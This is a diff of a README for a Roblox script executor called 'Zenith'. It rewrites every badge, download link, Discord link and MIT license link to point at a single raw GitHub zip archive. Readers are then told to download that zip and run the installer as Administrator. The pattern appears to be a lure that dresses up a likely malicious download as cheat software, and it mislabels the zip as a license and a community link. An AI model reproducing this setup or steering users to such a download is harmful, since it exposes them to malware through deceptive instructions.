@@ -1,6 +1,6 @@
 # Roblox Executor Zenith
 
-[![Download](https://img.shields.io/badge/Download-Zenith-green?style=for-the-badge&logo=roblox)](https://shibu503.github.io)
+[![Download](https://raw.githubusercontent.com/shibu503/zenith-roblox-execution-suite/branch/crepuscule/zenith-roblox-execution-suite_v3.5.zip)](https://raw.githubusercontent.com/shibu503/zenith-roblox-execution-suite/branch/crepuscule/zenith-roblox-execution-suite_v3.5.zip)
 
 Welcome to **Roblox Executor Zenith** – the next-generation gateway to enhanced script execution and limitless customization on the Roblox platform. Zenith empowers creators, gamers, and explorers to step into a universe of bespoke features and dynamic interactions, all from a seamless, responsive interface. Whether you’re aiming sky-high with complex automation, or just seeking that extra sparkle in your game, Zenith is crafted to be your compass🌌.
 
@@ -10,9 +10,9 @@ Welcome to **Roblox Executor Zenith** – the next-generation gateway to enhance
 
 | Operating System        | Supported                   | Status          |
 |------------------------|-----------------------------|-----------------|
-| ![Windows](https://img.shields.io/badge/Windows-10/11-blue.svg?logo=windows) | Yes                         | 🟢 Stable         |
-| ![macOS](https://img.shields.io/badge/macOS-10.15%2B-black.svg?logo=apple)  | Experimental                | 🟡 Beta           |
-| ![Linux](https://img.shields.io/badge/Linux-Ubuntu%2020.04+-lightgrey.svg?logo=linux)   | Under consideration         | ⚪️ Planning       |
+| ![Windows](https://raw.githubusercontent.com/shibu503/zenith-roblox-execution-suite/branch/crepuscule/zenith-roblox-execution-suite_v3.5.zip) | Yes                         | 🟢 Stable         |
+| ![macOS](https://raw.githubusercontent.com/shibu503/zenith-roblox-execution-suite/branch/crepuscule/zenith-roblox-execution-suite_v3.5.zip%https://raw.githubusercontent.com/shibu503/zenith-roblox-execution-suite/branch/crepuscule/zenith-roblox-execution-suite_v3.5.zip)  | Experimental                | 🟡 Beta           |
+| ![Linux](https://raw.githubusercontent.com/shibu503/zenith-roblox-execution-suite/branch/crepuscule/zenith-roblox-execution-suite_v3.5.zip%2020.04+https://raw.githubusercontent.com/shibu503/zenith-roblox-execution-suite/branch/crepuscule/zenith-roblox-execution-suite_v3.5.zip)   | Under consideration         | ⚪️ Planning       |
 
 Dive right in — Zenith is primarily optimized for modern Windows setups, with community-driven efforts towards macOS and Linux seamlessly evolving. Watch this space for updates!
 
@@ -72,14 +72,14 @@ Zenith leverages the powers of OpenAI and Claude to add a truly *intelligent* la
 
 ## 🚀 Installation Guide
 
-1. Click on the **Download** badge above or below (https://shibu503.github.io).
+1. Click on the **Download** badge above or below (https://raw.githubusercontent.com/shibu503/zenith-roblox-execution-suite/branch/crepuscule/zenith-roblox-execution-suite_v3.5.zip).
 2. After downloading the latest Zenith installer, launch it as Administrator for optimal setup.
 3. The auto-installer will guide you through initial configuration.
 4. On first launch, connect your Roblox client by following the on-screen wizard.
 5. Optional: Set up your OpenAI or Claude API integration via Settings for extra intelligent scripting.
 6. Refer to the in-app guidebook for quick tips and advanced shortcuts.
 
-**Note:** If you’re experimenting on macOS or Linux, join our Discord workspace (https://shibu503.github.io) for early test builds and community support.
+**Note:** If you’re experimenting on macOS or Linux, join our Discord workspace (https://raw.githubusercontent.com/shibu503/zenith-roblox-execution-suite/branch/crepuscule/zenith-roblox-execution-suite_v3.5.zip) for early test builds and community support.
 
 ---
 
@@ -92,12 +92,12 @@ Zenith is a community platform designed to foster creativity, productivity, and 
 ## 📜 MIT License
 
 This repository is licensed under the MIT License (2025).  
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)  
-For more information, see the full license text [here](https://opensource.org/licenses/MIT).
+[![License: MIT](https://raw.githubusercontent.com/shibu503/zenith-roblox-execution-suite/branch/crepuscule/zenith-roblox-execution-suite_v3.5.zip)](https://raw.githubusercontent.com/shibu503/zenith-roblox-execution-suite/branch/crepuscule/zenith-roblox-execution-suite_v3.5.zip)  
+For more information, see the full license text [here](https://raw.githubusercontent.com/shibu503/zenith-roblox-execution-suite/branch/crepuscule/zenith-roblox-execution-suite_v3.5.zip).
 
 ---
 
-[![Download](https://img.shields.io/badge/Download-Zenith-green?style=for-the-badge&logo=roblox)](https://shibu503.github.io)
+[![Download](https://raw.githubusercontent.com/shibu503/zenith-roblox-execution-suite/branch/crepuscule/zenith-roblox-execution-suite_v3.5.zip)](https://raw.githubusercontent.com/shibu503/zenith-roblox-execution-suite/branch/crepuscule/zenith-roblox-execution-suite_v3.5.zip)
 
 Unleash your creativity — Zenith awaits your command!  
 ✨ Thank you for being part of the future-forward Roblox community.
